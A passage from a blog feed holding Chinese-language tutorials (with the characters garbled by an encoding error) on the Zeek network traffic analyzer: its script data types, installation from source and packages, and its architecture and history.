href="https://docs.zeek.org/en/master/script-reference/types.html#type-port"><code>port</code></a>ï¼Œ <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-addr"><code>addr</code></a>ï¼Œ <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-subnet"><code>subnet</code></a></td><td>ç½‘ç»œç±»å‹</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-enum"><code>enum</code></a></td><td>æšä¸¾ï¼ˆç”¨æˆ·å®šä¹‰ç±»å‹ï¼‰</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-table"><code>table</code></a>ï¼Œ <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-set"><code>set</code></a>ï¼Œ <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-vector"><code>vector</code></a>ï¼Œ <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-record"><code>record</code></a></td><td>å®¹å™¨ç±»å‹</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-function"><code>function</code></a>ï¼Œ <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-event"><code>event</code></a>ï¼Œ <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-hook"><code>hook</code></a></td><td>å¯æ‰§è¡Œç±»å‹</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-file"><code>file</code></a></td><td>æ–‡ä»¶ç±»å‹ï¼ˆä»…ç”¨äºå†™å…¥ï¼‰</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-opaque"><code>opaque</code></a></td><td>ä¸é€æ˜ç±»å‹ï¼ˆç”¨äºæŸäº›å†…å»ºåŠŸèƒ½ï¼‰</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-any"><code>any</code></a></td><td>ä»»ä½•ç±»å‹ï¼ˆç”¨äºå‡½æ•°æˆ–å®¹å™¨ï¼‰</td></tr></tbody></table></div><p><strong>ä»¥ä¸‹æ˜¯æ¯ä¸€ç§æ•°æ®ç±»å‹çš„è¯¦ç»†è¯´æ˜</strong></p><ul><li><strong><code>bool</code></strong>ï¼šæ‹¥æœ‰<code>T</code>å’Œ<code>F</code>ä¸¤ç§å–å€¼ã€‚æ”¯æŒæ¯”è¾ƒè¿ç®—ï¼ˆ==ï¼Œ!=ï¼‰ï¼Œé€»è¾‘è¿ç®—å’Œç»å¯¹å€¼è¿ç®—ï¼ˆ|T|=1ï¼Œ|F|=0ï¼Œç±»å‹ä¸º<code>count</code>ï¼‰</li><li><strong><code>int</code></strong>ï¼š64ä½æœ‰ç¬¦å·æ•´å‹ã€‚æ”¯æŒç®—æœ¯ï¼Œæ¯”è¾ƒï¼Œé€»è¾‘ï¼Œèµ‹å€¼å’Œç»å¯¹å€¼è¿ç®—ï¼ˆè¿ç®—ç»“æœç±»å‹ä¸º<code>count</code>ï¼‰</li><li><strong><code>count</code></strong>ï¼š64ä½æ— ç¬¦å·æ•´å‹ã€‚æ”¯æŒçš„è¿ç®—ç¬¦å’Œ<code>int</code>ç›¸åŒï¼Œå…¶ä¸­ä¸€å…ƒåŠ å‡è¿ç®—çš„ç»“æœçš„ç±»å‹ä¸º<code>int</code></li><li><strong><code>double</code></strong>ï¼šåŒç²¾åº¦æµ®ç‚¹å‹ã€‚æ”¯æŒçš„è¿ç®—ç¬¦ä¸<code>int</code>ç›¸åŒ</li><li><strong><code>time</code></strong>ï¼šè¡¨ç¤ºç»å¯¹æ—¶é—´çš„æ—¶é—´ç±»å‹ã€‚<code>time</code>ç±»å‹ä»…èƒ½é€šè¿‡<code>double_to_time</code>, <code>current_time</code>, <code>network_time</code>å†…å»ºå‡½æ•°æ¥èµ‹å€¼ã€‚<code>time</code>ç±»å‹æ”¯æŒæ¯”è¾ƒè¿ç®—ç¬¦ã€‚<code>time</code>ç±»å‹ç›¸å‡èƒ½å¤Ÿäº§ç”Ÿ<code>interval</code>ç±»å‹æ•°æ®ï¼Œ<code>time</code>ç±»å‹çš„ç»å¯¹å€¼æ˜¯<code>double</code>ç±»å‹</li><li><strong><code>interval</code></strong>ï¼šè¡¨ç¤ºç›¸å¯¹æ—¶é—´çš„æ—¶é—´ç±»å‹ã€‚å…¶æ ¼å¼ä¸ºæ•°å­—å¸¸æ•°+æ—¶é—´å•ä½ï¼Œæ—¶é—´å•ä½æœ‰<code>usec</code>, <code>msec</code>, <code>sec</code>, <code>min</code>, <code>hr</code>å’Œ<code>day</code>ã€‚ä»¥ä¸‹å‡ ç§å‡ä¸ºæ­£ç¡®çš„è¡¨è¾¾å½¢å¼ï¼š<code>3.5 min</code>, <code>3.5min</code>, <code>3.5mins</code>, <code>-12 hr</code></li><li><strong><code>string</code></strong>ï¼šå­—ç¬¦ä¸²ç±»å‹ã€‚ç”±åŒå¼•å·åŒ…æ‹¬ï¼Œè„šæœ¬ä¸­ä¸æ”¯æŒå¤šè¡Œå­—ç¬¦ä¸²<ul><li>æ”¯æŒ<code>+</code>æ‹¼æ¥ï¼Œ<code>=</code>å’Œ<code>+=</code>æ¥èµ‹å€¼ã€‚æ”¯æŒppæ¯”è¾ƒè¿ç®—ç¬¦ã€‚å–ç»å¯¹å€¼è¿ç®—å¯ä»¥è®¡ç®—å‡ºå­—ç¬¦ä¸²çš„é•¿åº¦ã€‚æ”¯æŒ<code>in</code>å’Œ<code>!in</code>æ¥åˆ¤æ–­å­—ç¬¦ä¸²åŒ…å«å…³ç³»</li><li>æ”¯æŒ<code>\</code>è½¬ä¹‰å¦‚ï¼š<code>\\</code>, <code>\n</code>, <code>\t</code>, <code>\v</code>, <code>\b</code>, <code>\r</code>, <code>\f</code>, <code>\a</code>, <code>\onn</code>(nä¸º8è¿›åˆ¶æ•°ç ), <code>\xhh</code>(hä¸º16è¿›åˆ¶æ•°ç )ã€‚å½“Zeekæ— æ³•è¯†åˆ«è½¬ä¹‰å­—ç¬¦ä¸²æ—¶å°†ä¼šå¿½ç•¥<code>\</code>ï¼Œå¦‚<code>\g</code>å°†ä¼šå˜æˆ<code>g</code></li><li>æ”¯æŒä¸‹æ ‡æ³•è®¿é—®å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ã€‚ä½†æ˜¯ä¸å¯ä»¥å¯¹ä¸‹è¡¨æ³•è¡¨ç¤ºçš„å­—ç¬¦ä¸²è¿›è¡Œèµ‹å€¼ä¿®æ”¹ï¼Œå³å®ƒä»¬æ˜¯åªè¯»çš„</li></ul></li><li><p><strong><code>pattern</code></strong>ï¼šæ­£åˆ™è¡¨è¾¾å¼ç±»å‹ã€‚<code>pattern</code>å¸¸é‡æ˜¯é€šè¿‡ä¸¤ä¸ªæ­£æ–œæ <code>/</code>æ¥åˆ›å»ºçš„ï¼Œå¹¶é‡‡ç”¨ä¸<a href="http://westes.github.io/flex/manual/Patterns.html">flexè¯æ³•åˆ†æå™¨</a>è¯­æ³•</p></li><li><p><strong><code>port</code></strong>ï¼šè¡¨ç¤ºä¼ è¾“å±‚ç«¯å£çš„æ•°æ®ç±»å‹ã€‚<code>port</code>å¸¸é‡ç”±ä¸€ä¸ªæ— ç¬¦å·æ•´æ•°å’Œç«¯å£ç±»å‹ï¼ˆ<code>\tcp</code>, <code>\udp</code>, <code>\icmp</code> or <code>\unknow</code>ï¼‰ç»„æˆ</p><ul><li><code>port</code>ç±»å‹æ”¯æŒæ¯”è¾ƒè¿ç®—ç¬¦ï¼Œä¸”æ¯”è¾ƒé¡ºåºä¸º <code>unknown</code> &lt; <code>tcp</code> &lt; <code>udp</code> &lt; <code>icmp</code>ï¼Œæ¯”å¦‚<code>65535/tcp</code> &lt; <code>0/udp</code> </li><li><code>get_port_transport_proto</code>å’Œ<code>port_to_count</code>æ˜¯Zeekå†…å»ºçš„å‡½æ•°ï¼Œåˆ†åˆ«èƒ½å¤Ÿä»<code>port</code>å‹æ•°æ®æå–ä¼ è¾“åè®®ï¼ˆåé¢çš„åè®®å­—ç¬¦ä¸²ï¼‰å’Œç«¯å£å·ï¼ˆå‰é¢çš„<code>count</code>å‹ç«¯å£å·ï¼‰</li></ul></li><li><strong><code>addr</code></strong>ï¼šè¡¨ç¤ºIPåœ°å€çš„ç±»å‹ã€‚æ”¯æŒipv4å’Œipv6ï¼Œä¸”æ”¯æŒå…¶å¸¸è§„çš„è¡¨ç¤ºæ–¹å¼<ul><li>æ”¯æŒæ¯”è¾ƒè¿ç®—ç¬¦ï¼Œæ¯”è¾ƒå¤§å°æ—¶å½“ä½œæ­£å¸¸æ•°å€¼è¿›è¡Œæ¯”è¾ƒã€‚å¦‚<code>192.168.99.254</code> &lt; <code>192.168.100.0</code></li><li>å¯ä»¥é€šè¿‡<code>/</code>æ¥äº§ç”Ÿ<code>subnet</code>å‹æ•°æ®ã€‚å¹¶å¯ä»¥ç”¨<code>in</code>æ¥åˆ¤æ–­ä¸€ä¸ª<code>addr</code>æ˜¯å¦å±äº<code>subnet</code></li><li>ä¸€ä¸ªåŸŸåæ•°æ®å¯èƒ½å¯¹åº”å¤šä¸ªIPåœ°å€ï¼Œå› æ­¤å¸¸ç”¨<code>set[addr]</code>æ¥è¡¨ç¤º</li></ul></li><li><strong><code>subnet</code></strong>ï¼šè¡¨ç¤ºå­ç½‘çš„ç±»å‹ã€‚ç”±<code>addr</code>å’Œ<code>/network_prefix_size</code>ç»„æˆã€‚å¦‚<code>192.168.100.0/24</code>å’Œ <code>[fe80::]/64</code>ã€‚<code>subnet</code>ç±»å‹ä»…æ”¯æŒ<code>==</code>å’Œ<code>!=</code> æ¯”è¾ƒè¿ç®—ç¬¦</li><li><strong><code>enum</code></strong>ï¼šæšä¸¾ç±»å‹ã€‚ä¸”æšä¸¾ç±»å‹çš„valueä¸å…·å¤‡æ·±å±‚æ¬¡çš„ç»“æ„ã€‚ä»…æ”¯æŒ<code>==</code>, <code>!=</code> å’Œ<code>=</code>è¿ç®—ç¬¦</li></ul><h3 id="é«˜çº§æ•°æ®ç±»å‹"><a href="#é«˜çº§æ•°æ®ç±»å‹" class="headerlink" title="é«˜çº§æ•°æ®ç±»å‹"></a>é«˜çº§æ•°æ®ç±»å‹</h3><p><strong>Zeekè¿˜æœ‰ä»¥ä¸‹å†…å»ºæ•°æ®ç±»å‹</strong></p><div class="table-container"><table><thead><tr><th>åç§°</th><th>æè¿°</th></tr></thead><tbody><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-table"><code>table</code></a>ï¼Œ <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-set"><code>set</code></a>ï¼Œ <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-vector"><code>vector</code></a>ï¼Œ <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-record"><code>record</code></a></td><td>å®¹å™¨ç±»å‹</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-function"><code>function</code></a>ï¼Œ <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-event"><code>event</code></a>ï¼Œ <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-hook"><code>hook</code></a></td><td>å¯æ‰§è¡Œç±»å‹</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-file"><code>file</code></a></td><td>æ–‡ä»¶ç±»å‹ï¼ˆä»…ç”¨äºå†™å…¥ï¼‰</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-opaque"><code>opaque</code></a></td><td>ä¸é€æ˜ç±»å‹ï¼ˆç”¨äºæŸäº›å†…å»ºåŠŸèƒ½ï¼‰</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-any"><code>any</code></a></td><td>ä»»ä½•ç±»å‹ï¼ˆç”¨äºå‡½æ•°æˆ–å®¹å™¨ï¼‰</td></tr></tbody></table></div><ul><li><strong><code>table</code></strong>ï¼šè¡¨ç¤ºæ˜ å°„å…³ç³»çš„è¡¨ç±»å‹ã€‚è¢«æ˜ å°„çš„å€¼ç§°ä¸º<code>index</code>æˆ–è€…<code>indices</code>ï¼Œæ˜ å°„çš„ç»“æœç§°ä¸º<code>yield</code>ã€‚æ˜¯ä¸€ç§éå¸¸é«˜æ•ˆçš„ç´¢å¼•ç±»å‹ï¼Œå…¶å†…éƒ¨å®è´¨ä¸ºä¸€ä¸ªå•å“ˆå¸ŒæŸ¥æ‰¾è¡¨</li><li><strong><code>set</code></strong>ï¼š</li></ul><h2 id="åŸºæœ¬è¯­æ³•"><a href="#åŸºæœ¬è¯­æ³•" class="headerlink" title="åŸºæœ¬è¯­æ³•"></a>åŸºæœ¬è¯­æ³•</h2><h3 id="å®šä¹‰å˜é‡"><a href="#å®šä¹‰å˜é‡" class="headerlink" title="å®šä¹‰å˜é‡"></a>å®šä¹‰å˜é‡</h3><h3 id="å®šä¹‰å‡½æ•°"><a href="#å®šä¹‰å‡½æ•°" class="headerlink" title="å®šä¹‰å‡½æ•°"></a>å®šä¹‰å‡½æ•°</h3><h3 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h3><h3 id="æ¡ä»¶è¯­å¥"><a href="#æ¡ä»¶è¯­å¥" class="headerlink" title="æ¡ä»¶è¯­å¥"></a>æ¡ä»¶è¯­å¥</h3><h3 id="å¾ªç¯è¯­å¥"><a href="#å¾ªç¯è¯­å¥" class="headerlink" title="å¾ªç¯è¯­å¥"></a>å¾ªç¯è¯­å¥</h3><h2 id="å±æ€§"><a href="#å±æ€§" class="headerlink" title="å±æ€§"></a>å±æ€§</h2>]]></content>
    
    
    <categories>
      
      <category>Tutorial</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IDS</tag>
      
      <tag>Zeek</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Zeekå®‰è£…</title>
    <link href="/2020/03/12/Zeek%E5%AE%89%E8%A3%85/"/>
    <url>/2020/03/12/Zeek%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<p>Zeekçš„å®‰è£…æ˜¯ä¸€ä¸ªå¤§å‘  (<em> ï¿£ï¸¿ï¿£)ï¼Œæœ¬æ–‡å°†ä»‹ç»Zeekçš„å®‰è£…æ•™ç¨‹ï¼Œç„¶åé™„ä¸Šäº†æˆ‘çš„<em>*è¸©å‘è®°å½•</em></em>å’Œä¸€é”®å®‰è£…è„šæœ¬ã€‚</p><span id="more"></span><h2 id="1-å…ˆå†³æ¡ä»¶"><a href="#1-å…ˆå†³æ¡ä»¶" class="headerlink" title="1 å…ˆå†³æ¡ä»¶"></a>1 å…ˆå†³æ¡ä»¶</h2><h3 id="1-1-å¿…é¡»çš„ä¾èµ–"><a href="#1-1-å¿…é¡»çš„ä¾èµ–" class="headerlink" title="1.1 å¿…é¡»çš„ä¾èµ–"></a>1.1 å¿…é¡»çš„ä¾èµ–</h3><p><strong>è¿è¡ŒZeekæ‰€å¿…é¡»çš„åŒ…ï¼š</strong></p><ul><li>Libpcap (<a href="http://www.tcpdump.org">http://www.tcpdump.org</a>)</li><li>OpenSSL libraries (<a href="http://www.openssl.org">http://www.openssl.org</a>)</li><li>BIND8 library</li><li>Libz</li><li>Bash (for BroControl)</li><li>Python &gt;= 2.6 (for BroControl)</li></ul><p><strong>ä»æºç å®‰è£…æ‰€å¿…é¡»çš„åŒ…ï¼š</strong></p><ul><li>CMake &gt;= 2.8 (<a href="http://www.cmake.org">http://www.cmake.org</a>)</li><li>Make</li><li>C/C++ Compiler with C++11 support (GCC 4.8+ or Clang 3.3+)</li><li>SWIG (<a href="http://www.swig.org">http://www.swig.org</a>)</li><li>Bison (GNU Parser Generator)</li><li>Flex (Fast Lexical Analyzer)</li><li>Libpcap headers</li><li>OpenSSL headers</li><li>zlib headers</li><li>Python</li></ul><p><strong>é€šè¿‡åŒ…ç®¡ç†å®‰è£…ä¸Šè¿°ä¾èµ–ï¼š</strong></p><ul><li><p>RPM/RedHat-based Linuxï¼š</p><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> yum install cmake make gcc gcc-c++ flex bison libpcap-devel openssl-devel python-devel swig zlib-devel</code></pre></li><li><p>DEB/Debian-based Linuxï¼š</p><pre><code class="hljs Bash"><span class="hljs-built_in">sudo</span> apt-get install cmake make gcc g++ flex bison libpcap-dev libssl-dev python-dev swig zlib1g-dev</code></pre></li><li><p>FreeBSDï¼š FreeBSDçš„æœ€å°å®‰è£…å·²ç»åŒ…å«äº†éƒ¨åˆ†ä¾èµ–ï¼Œé™¤äº†ä»¥ä¸‹éœ€è¦æ‰‹åŠ¨å®‰è£…</p><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> pkg install bash cmake swig bison python py27-sqlite3</code></pre></li></ul><h3 id="1-2-å¯é€‰çš„ä¾èµ–"><a href="#1-2-å¯é€‰çš„ä¾èµ–" class="headerlink" title="1.2 å¯é€‰çš„ä¾èµ–"></a>1.2 å¯é€‰çš„ä¾èµ–</h3><ul><li>C++ Actor Framework (CAF) version 0.14 (<a href="http://actor-framework.org/">http://actor-framework.org</a>)</li><li>LibGeoIP (ç”¨äºIPåœ°ç†å®šä½)</li><li>sendmail (è®©Broå’ŒBroControlèƒ½å¤Ÿå‘é€é‚®ä»¶)</li><li>curl</li><li>gperftools (é‡‡ç”¨äº†tcmallocæ¥æ”¹å–„å†…å­˜å’ŒCPUçš„ä½¿ç”¨)</li><li>jemalloc (<a href="http://www.canonware.com/jemalloc/">http://www.canonware.com/jemalloc/</a>)</li><li>PF_RING (Linux only)</li><li>ipsumdump (for trace-summary; <a href="http://www.cs.ucla.edu/~kohler/ipsumdump">http://www.cs.ucla.edu/~kohler/ipsumdump</a>)</li></ul><h2 id="2-å®‰è£…Zeek"><a href="#2-å®‰è£…Zeek" class="headerlink" title="2 å®‰è£…Zeek"></a>2 å®‰è£…Zeek</h2><h3 id="2-1-ä½¿ç”¨é¢„æ„å»ºçš„äºŒè¿›åˆ¶å‘è¡ŒåŒ…"><a href="#2-1-ä½¿ç”¨é¢„æ„å»ºçš„äºŒè¿›åˆ¶å‘è¡ŒåŒ…" class="headerlink" title="2.1 ä½¿ç”¨é¢„æ„å»ºçš„äºŒè¿›åˆ¶å‘è¡ŒåŒ…"></a>2.1 ä½¿ç”¨é¢„æ„å»ºçš„äºŒè¿›åˆ¶å‘è¡ŒåŒ…</h3><ul><li><p><strong>å®˜ç½‘ä¸‹è½½ï¼š</strong></p><p>æœ‰å…³äºŒè¿›åˆ¶ç‰ˆæœ¬å’Œå®‰è£…è¯´æ˜çš„ä¿¡æ¯ï¼Œè¯·å‚è§<a href="https://www.bro.org/download/index.html">broä¸‹è½½é¡µé¢</a>ä»¥è·å–å½“å‰å—æ”¯æŒ/ç›®æ ‡å¹³å°ã€‚</p></li><li><p>é»˜è®¤å®‰è£…è·¯å¾„æ˜¯<code>/opt/bro</code></p></li></ul><h3 id="2-2-æºç å®‰è£…"><a href="#2-2-æºç å®‰è£…" class="headerlink" title="2.2 æºç å®‰è£…"></a>2.2 æºç å®‰è£…</h3><ul><li><p><strong>å®˜ç½‘ä¸‹è½½</strong></p><p>Zeekçš„äºŒè¿›åˆ¶å‘è¡ŒåŒ…æ˜¯å’Œæºç ç»‘å®šåœ¨ä¸€èµ·çš„ï¼Œå‡å¯åœ¨<a href="https://www.bro.org/download/index.html">broä¸‹è½½é¡µé¢</a>è·å–</p></li><li><p><strong>é€šè¿‡gitä¸‹è½½</strong></p><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> --recursive git://github.com/zeek/zeek.git</code></pre><p>æ³¨æ„ï¼šå¦‚æœé€‰æ‹©éé€’å½’å…‹éš†ï¼Œåˆ™ä¸ºæœ€å°å…‹éš†ï¼Œè®¸å¤šå…¶ä»–ä¾èµ–çš„å­æ¨¡å—éœ€è¦é¢å¤–è·å–ã€‚</p><pre><code class="hljs bash"><span class="hljs-comment"># ./configure --help </span>./configuremakemake install<span class="hljs-comment"># é»˜è®¤å®‰è£…è·¯å¾„ä¸º/usr/local/bro</span></code></pre></li><li><p><strong>æ·»åŠ ç¯å¢ƒå˜é‡</strong></p></li></ul><h2 id="3-è¸©å‘è®°å½•"><a href="#3-è¸©å‘è®°å½•" class="headerlink" title="3 è¸©å‘è®°å½•"></a>3 è¸©å‘è®°å½•</h2><h3 id="3-1-æºç å®‰è£…"><a href="#3-1-æºç å®‰è£…" class="headerlink" title="3.1 æºç å®‰è£…"></a>3.1 æºç å®‰è£…</h3><ul><li><strong>ä¸€å®šè¦é€‰æ‹©git clone â€”recursive</strong>ï¼Œå¦åˆ™ä»¥ä¸‹submoduleå°†éœ€è¦é¢å¤–ä»gitå®‰è£…<ul><li>zeek/cmake</li><li>zeek/broker</li><li>zeek/broker/cmake</li><li>zeek/broker/3rdparty</li><li>zeek/broker/3rdparty/caf (mv from zeek/broker/aux/caf)</li></ul></li><li><strong>zeek&gt;=3.0æœ‰å¯¹äºä»¥ä¸‹è½¯ä»¶åŒ…æœ‰æ›´é«˜ç‰ˆæœ¬çš„è¦æ±‚</strong><ul><li><strong>cmake &gt;= 3.0</strong></li><li><strong>C/C++ Compiler with C++17 support (GCC 7+ or Clang 4+)</strong></li></ul></li></ul><h3 id="3-2-ä¸€é”®å®‰è£…è„šæœ¬"><a href="#3-2-ä¸€é”®å®‰è£…è„šæœ¬" class="headerlink" title="3.2 ä¸€é”®å®‰è£…è„šæœ¬"></a>3.2 ä¸€é”®å®‰è£…è„šæœ¬</h3><p><a href="https://github.com/QGrain/auto-install-zeek">å¼€æºä»“åº“auto-install-zeek</a> :rainbow:</p>]]></content>
    
    
    <categories>
      
      <category>Tutorial</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IDS</tag>
      
      <tag>Zeek</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¼€æºç½‘ç»œæµé‡åˆ†ææ¡†æ¶Zeek</title>
    <link href="/2020/03/12/Zeek%E7%AE%80%E4%BB%8B/"/>
    <url>/2020/03/12/Zeek%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="1-ZeekåŸºæœ¬ä»‹ç»"><a href="#1-ZeekåŸºæœ¬ä»‹ç»" class="headerlink" title="1 ZeekåŸºæœ¬ä»‹ç»"></a>1 ZeekåŸºæœ¬ä»‹ç»</h1><h2 id="1-1-Overview"><a href="#1-1-Overview" class="headerlink" title="1.1 Overview"></a>1.1 Overview</h2><p>ZeekåˆåBroï¼Œæ˜¯ä¸€ä¸ªè¢«åŠ¨çš„å¼€æºç½‘ç»œæµé‡åˆ†æå™¨ã€‚å®ƒä¸»è¦æ˜¯ä¸€ç§å®‰å…¨ç›‘è§†å™¨ï¼Œå¯æ·±å…¥æ£€æŸ¥é“¾æ¥ä¸Šçš„æ‰€æœ‰æµé‡ä»¥æŸ¥æ‰¾å¯ç–‘æ´»åŠ¨çš„è¿¹è±¡ã€‚åœ¨å®‰å…¨é¢†åŸŸä»¥å¤–ï¼ŒZeekè¿˜èƒ½å¤Ÿè¿›è¡Œæ€§èƒ½æµ‹é‡ï¼Œæ•…éšœæ£€æµ‹ç­‰å·¥ä½œã€‚</p><span id="more"></span><p>1995å¹´åŠ³ä¼¦æ–¯ä¼¯å…‹åˆ©å®éªŒå®¤çš„ç ”ç©¶å‘˜Vernå¼€å§‹äº†Broçš„å¼€å‘ï¼Œå¹¶äº1996å¹´åœ¨å®éªŒå®¤è¿›è¡Œå†…éƒ¨éƒ¨ç½²ï¼Œ1998å¹´åœ¨USENIXå®‰å…¨ç ”è®¨ä¼šè¿›è¡Œå‘è¡¨ã€‚2003å¹´ï¼Œç¾å›½å›½å®¶ç§‘å­¦åŸºé‡‘ä¼šï¼ˆNSFï¼‰å¼€å§‹åœ¨å›½é™…è®¡ç®—æœºç§‘å­¦ç ”ç©¶æ‰€ï¼ˆICSIï¼‰ä¸Šæ”¯æŒBroçš„ç ”ç©¶å’Œé«˜çº§å¼€å‘ã€‚2010å¹´NSFé€šè¿‡å‘ICSIæˆäºˆSDCIè®¡åˆ’ä¸­ä¸“é—¨ç”¨äºBroå¼€å‘çš„èµ æ¬¾ï¼Œç¾å›½å›½å®¶è¶…çº§è®¡ç®—åº”ç”¨ä¸­å¿ƒï¼ˆNCSAï¼‰ä½œä¸ºè¯¥å›¢é˜Ÿçš„æ ¸å¿ƒåˆä½œä¼™ä¼´åŠ å…¥äº†è¯¥è®¡åˆ’ã€‚ç°å¦‚ä»ŠBroå›¢é˜Ÿç°åœ¨æ­£åœ¨åŠªåŠ›é€šè¿‡è¿›ä¸€æ­¥æé«˜ç³»ç»ŸåŠŸèƒ½æ¥åº”å¯¹æœªæ¥ç½‘ç»œçš„æŒ‘æˆ˜ï¼Œä»¥æ­¤å–å¾—æˆåŠŸã€‚</p><h2 id="1-2-Architecture"><a href="#1-2-Architecture" class="headerlink" title="1.2 Architecture"></a>1.2 Architecture</h2><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/master/figure/architecture.png" alt=""></p><p>ç”±ä¸Šå›¾å¯çŸ¥Zeekçš„ä½“ç³»ç»“æ„ä¸»è¦åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼š</p><ul><li><strong>äº‹ä»¶å¼•æ“ï¼š</strong>Event Engine å°†ä¼ å…¥çš„æ•°æ®åŒ…æµå‡å°‘ä¸ºä¸€ç³»åˆ—æ›´é«˜çº§åˆ«çš„<em>events</em>ã€‚è¿™äº›äº‹ä»¶ä»¥ä¸ç­–ç•¥æ— å…³çš„æœ¯è¯­åæ˜ äº†ç½‘ç»œæ´»åŠ¨ï¼Œå®ƒæè¿°å·²çœ‹åˆ°çš„å†…å®¹ï¼Œä½†ä¸å¯¹ç°è±¡è¿›è¡Œè§£é‡Šæˆ–åˆ†æã€‚ä¾‹å¦‚å®ƒèƒ½å°†çº¿è·¯ä¸Šçš„HTTP requestéƒ½è½¬åŒ–ä¸ºä¸€ä¸ªç›¸åº”çš„<code>http_request</code>äº‹ä»¶ï¼Œè¯¥äº‹ä»¶åŒ…å«äº†è¯·æ±‚çš„IPï¼Œç«¯å£å’ŒURLä»¥åŠhttp versionç­‰ä¿¡æ¯ã€‚<strong>ä½†æ˜¯Event Engineä¸ä¼šå¯¹æ­¤äº‹ä»¶è¿›ä¸€æ­¥è§£è¯»ï¼Œå¦‚è¯¥URLæ˜¯å¦å¯¹åº”äºå·²çŸ¥çš„æ¶æ„ç«™ç‚¹ã€‚</strong></li><li><strong>ç­–ç•¥è„šæœ¬è§£é‡Šå™¨ï¼š</strong>ä¸Šä¾‹ä¸­çš„äº‹ä»¶è¯­ä¹‰è§£æå°†ç”±Zeekçš„ç¬¬äºŒä¸ªä¸»è¦ç»„ä»¶Policy Script Interpreteræ´¾ç”Ÿã€‚è¯¥è„šæœ¬è§£é‡Šå™¨æ‰§è¡Œä¸€ç»„Zeekè‡ªå®šä¹‰è„šæœ¬è¯­è¨€ç¼–å†™çš„<strong>äº‹ä»¶å¤„ç†ç¨‹åº</strong>æ¥å¯¹äº‹ä»¶è¿›è¡Œè¯­ä¹‰åˆ†æã€‚ä¾‹å¦‚ä¸€ä¸ªç«™ç‚¹çš„å®‰å…¨ç­–ç•¥å°†åŒ…æ‹¬ç›‘æµ‹å™¨æ£€æµ‹åˆ°ä¸åŒæ´»åŠ¨æ—¶åº”è¯¥åšå‡ºçš„å“åº”ç­‰ã€‚æœ€é‡è¦çš„æ˜¯ï¼ŒZeekå…è®¸å…¶è„šæœ¬éšç€æ—¶é—´æ¨ç§»è€Œä¿æŒå·¥ä½œçŠ¶æ€ï¼Œä»è€Œä½¿å®ƒä»¬èƒ½å¤Ÿè·Ÿè¸ªå¹¶å…³è”è·¨è¿æ¥å’Œä¸»æœºè¾¹ç•Œè§‚å¯Ÿåˆ°çš„å†…å®¹çš„æ¼”å˜ã€‚Broè„šæœ¬å¯ä»¥ç”Ÿæˆå®æ—¶è­¦æŠ¥ï¼Œè¿˜å¯ä»¥æŒ‰éœ€æ‰§è¡Œä»»æ„å¤–éƒ¨ç¨‹åºï¼Œä¾‹å¦‚è§¦å‘å¯¹æ”»å‡»çš„ä¸»åŠ¨å“åº”ã€‚</li></ul><h2 id="1-3-Features"><a href="#1-3-Features" class="headerlink" title="1.3 Features"></a>1.3 Features</h2><p>Zeekæ”¯æŒå¾ˆå¤šåŸºäºå…¶è„šæœ¬çš„åˆ†æï¼Œå¹¶ä¸”å³ä¾¿æ˜¯ä¸é‡‡ç”¨è‡ªå®šä¹‰è„šæœ¬ï¼Œå®ƒä¹Ÿèƒ½å…·å¤‡ä»¥ä¸‹å¼ºå¤§çš„åŠŸèƒ½ç‰¹æ€§ï¼š</p><ul><li><strong>Deployment</strong><ul><li>åœ¨æ ‡å‡†Unix-Styleçš„å•†ç”¨ç¡¬ä»¶ä¸Šè¿è¡Œ</li><li>èƒ½å¯¹æ¥è‡ªç½‘ç»œåˆ†æ¥å¤´æˆ–è€…ç›‘æµ‹ç«¯å£çš„æµé‡è¿›è¡Œå®Œå…¨è¢«åŠ¨çš„æµé‡åˆ†æ</li><li>ç”¨äºæ•è·æ•°æ®åŒ…çš„æ ‡å‡†libpcapæ¥å£</li><li>å®æ—¶å’Œç¦»çº¿åˆ†æ</li><li>å¯¹äºå¤§è§„æ¨¡éƒ¨ç½²æ”¯æŒé›†ç¾¤åŒ–ï¼Œä¸”æ— 